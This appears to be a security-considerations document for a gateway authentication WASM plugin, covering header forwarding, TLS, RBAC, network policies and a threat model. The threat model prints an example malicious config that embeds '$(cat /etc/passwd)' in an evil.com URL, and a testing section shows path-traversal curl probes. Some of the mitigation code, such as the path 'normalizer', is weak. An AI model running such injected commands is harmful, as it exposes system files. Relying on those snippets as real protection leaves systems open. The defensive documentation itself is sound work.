# Security Considerations

## Overview

This document outlines security considerations, best practices, and threat mitigation strategies for the BYOIDC WASM Plugin.

## Authentication Security

### Session-Based Authentication

**Cookie Forwarding Security**:
```rust
// Secure cookie forwarding implementation
if let Some(ref cookie_value) = cookie_header {
    // Forward ALL cookies - let auth service decide which are valid
    auth_headers.push(("cookie", cookie_value));
    // No logging of cookie values to prevent credential exposure
}
```

**Security Considerations**:
- ✅ **Secure Transmission**: Cookies forwarded over internal cluster network
- ✅ **No Logging**: Cookie values never logged to prevent credential exposure  
- ✅ **Validation Delegation**: Auth service validates session cookies, not WASM plugin
- ⚠️  **Trust Boundary**: WASM plugin trusts auth service's authentication decisions

### Authorization Header Handling

```rust
// Secure authorization header processing
if let Some(ref auth_value) = auth_header {
    auth_headers.push(("authorization", auth_value));
    // Log presence but not value
    debug!("Authorization header present");
}
```

## Network Security  

### TLS Configuration

**Production Configuration**:
```yaml
auth_service:
  endpoint: "https://auth-service.auth-system.svc.cluster.local:4180"
  tls:
    verify_cert: true
    ca_cert: "/etc/ssl/certs/ca-bundle.crt"
```

**Development Configuration** (Less Secure):
```yaml  
auth_service:
  endpoint: "http://auth-service.auth-system.svc.cluster.local:4180"
  tls:
    verify_cert: false  # Only for development/testing
```

### Cluster Network Security

**Internal Communication**:
- WASM plugin ↔ Auth service: Cluster-internal HTTP(S)
- Gateway ↔ WASM plugin: In-process communication
- No external network exposure of internal auth flows

## Input Validation and Sanitization

### Header Sanitization

```rust
// Prevent header injection attacks
fn sanitize_header_value(value: &str) -> String {
    // Remove potential injection characters
    value.chars()
        .filter(|c| !c.is_control() || *c == '\t')
        .collect()
}
```

### Configuration Validation

**Required Field Validation**:
```rust
impl PluginConfig {
    pub fn validate(&self) -> Result<(), String> {
        // Validate endpoint URL format
        if !self.auth_service.endpoint.starts_with("http") {
            return Err("Invalid endpoint format".to_string());
        }
        
        // Validate cluster name format  
        if !self.auth_service.cluster.contains("outbound|") {
            return Err("Invalid cluster name format".to_string());
        }
        
        Ok(())
    }
}
```

### Path Traversal Prevention

```rust  
// Prevent path traversal in skip_paths configuration
fn validate_skip_path(path: &str) -> bool {
    !path.contains("..") && path.starts_with("/")
}
```

## Error Handling Security

### Information Disclosure Prevention

**Secure Error Responses**:
```yaml
error_responses:
  auth_service_error:
    status: 503
    body: '{"error": "service_unavailable"}'  # Generic message
  
  access_denied:
    status: 401
    body: '{"error": "authentication_required"}'  # No details about why
```

**Security Principles**:
- ❌ **No Internal Details**: Never expose internal service names or configurations
- ❌ **No Stack Traces**: Never return debugging information to clients
- ❌ **No Timing Attacks**: Consistent response times regardless of failure reason

### Logging Security

```rust
// Secure logging practices
log::info!("Authentication check for path: {}", sanitized_path);
log::debug!("Auth service response status: {}", status_code);

// NEVER log sensitive data
// ❌ log::debug!("Cookie value: {}", cookie_value);
// ❌ log::debug!("Authorization header: {}", auth_header);
```

## Deployment Security

### RBAC and Permissions

**Minimal ServiceAccount Permissions**:
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: gateway-auth-wasm-plugin
  namespace: openshift-ingress
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: gateway-auth-wasm-plugin
  namespace: openshift-ingress
rules:
- apiGroups: [""]
  resources: ["services"]
  verbs: ["get"]  # Only read access to services
```

### Container Security

**Secure Container Image**:
```dockerfile  
# Use minimal base image
FROM scratch AS wasm

# Copy only required binary
COPY --from=builder /app/target/wasm32-unknown-unknown/release/gateway-auth-wasm-plugin.wasm /plugin.wasm

# Security labels
LABEL security.alpha.kubernetes.io/unsafe-syscalls=runtime/default
```

### Network Policies

**Restrict Network Access**:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: wasm-plugin-netpol
  namespace: openshift-ingress
spec:
  podSelector:
    matchLabels:
      app: router-default
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: kube-auth-proxy  # Only allow auth service access
    ports:
    - protocol: TCP
      port: 4180
```

## Threat Model

### Identified Threats

#### 1. Header Injection Attacks
**Threat**: Malicious headers injected through configuration or requests  
**Mitigation**: Input validation and header sanitization  
**Impact**: Medium  

#### 2. Authentication Bypass  
**Threat**: Requests bypassing authentication check  
**Mitigation**: Comprehensive path matching and validation  
**Impact**: High  

#### 3. Credential Exposure
**Threat**: Sensitive credentials logged or exposed  
**Mitigation**: Secure logging practices and no credential logging  
**Impact**: High  

#### 4. DoS via Configuration
**Threat**: Malicious configuration causing resource exhaustion  
**Mitigation**: Configuration validation and resource limits  
**Impact**: Medium  

### Attack Scenarios

#### Path Traversal Attack
**Scenario**: Attacker attempts to bypass authentication using path traversal
```bash
curl https://gateway.example.com/../admin/secret
```

**Mitigation**:
```rust
// Normalize paths before processing
fn normalize_path(path: &str) -> String {
    path.chars()
        .fold(String::new(), |mut acc, c| {
            if c == '.' && acc.ends_with("..") {
                acc.truncate(acc.len() - 2);
            } else {
                acc.push(c);
            }
            acc
        })
}
```

#### Configuration Injection
**Scenario**: Malicious configuration with embedded commands
```yaml
# Malicious attempt
auth_service:
  endpoint: "http://evil.com/$(cat /etc/passwd)"
```

**Mitigation**: Strict URL validation and sanitization

## Security Monitoring

### Security Metrics

**Key Security Metrics to Monitor**:
- Authentication failure rates
- Unusual request patterns  
- Configuration change events
- Service availability metrics

### Audit Logging

**Security-Relevant Events**:
```rust
// Log security events (not sensitive data)
log::warn!("Authentication bypass attempt for path: {}", path);
log::error!("Invalid configuration detected");
log::info!("Auth service unreachable - potential DoS");
```

### Alerting

**Security Alerts**:
- High authentication failure rates
- Auth service downtime
- Configuration validation failures
- Unusual traffic patterns

## Compliance Considerations

### Data Privacy

- **No PII Storage**: Plugin does not store personal information
- **Credential Forwarding**: Credentials forwarded securely to auth service
- **Session Management**: Delegated to auth service, no local session storage

### Regulatory Compliance

**FIPS Compliance**: When using kube-auth-proxy
- Auth service provides FIPS-compliant cryptography
- WASM plugin acts as transparent proxy
- No cryptographic operations in plugin code

## Security Testing

### Penetration Testing Scenarios

1. **Authentication Bypass Tests**
2. **Header Injection Tests**  
3. **Configuration Tampering Tests**
4. **DoS Resistance Tests**

### Security Validation

```bash
# Test authentication enforcement
curl -H "X-Malicious: ../admin" https://gateway.example.com/

# Test configuration validation  
# Apply malicious WasmPlugin config and verify rejection

# Test error response information disclosure
curl https://gateway.example.com/nonexistent
```

## Incident Response

### Security Incident Handling

1. **Immediate Response**: Disable plugin if security breach detected
2. **Investigation**: Collect logs and analyze attack vectors  
3. **Remediation**: Apply fixes and security updates
4. **Prevention**: Update monitoring and alerting

### Emergency Procedures

```bash
# Emergency disable WASM plugin
oc delete wasmplugin -n openshift-ingress gateway-auth-wasm-plugin

# Fallback to direct service access (if needed)
oc patch httproute -n echo-service <route-name> --patch '{...}'
```

*For additional security considerations specific to your deployment, consult your organization's security policies and conduct regular security assessments.*
